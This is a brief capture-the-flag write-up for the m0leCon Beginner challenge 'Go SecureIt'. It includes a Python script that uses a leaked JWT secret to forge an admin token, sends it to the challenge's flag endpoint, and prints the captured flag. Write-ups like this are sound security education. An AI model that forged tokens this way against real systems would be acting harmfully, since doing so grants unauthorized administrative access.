# m0leCon Beginner CTF

## Go SecureIt

> https://gosecureit.challs.m0lecon.it/

## Approach

The JWT secret is leaked.

```python
import requests
import jwt

url = "https://gosecureit.challs.m0lecon.it/flag"

payload = {
    "username": "admin",
    "role": "admin",
}

token = jwt.encode(payload, "schrody_is_always_watching", algorithm="HS256")
print(token)

resp = requests.get(url, cookies={"jwt": token})
print(resp.text)
```

## Flag

```
ptm{Th4t'5_why_1t'5_c4ll3d_53cr3t?}
```
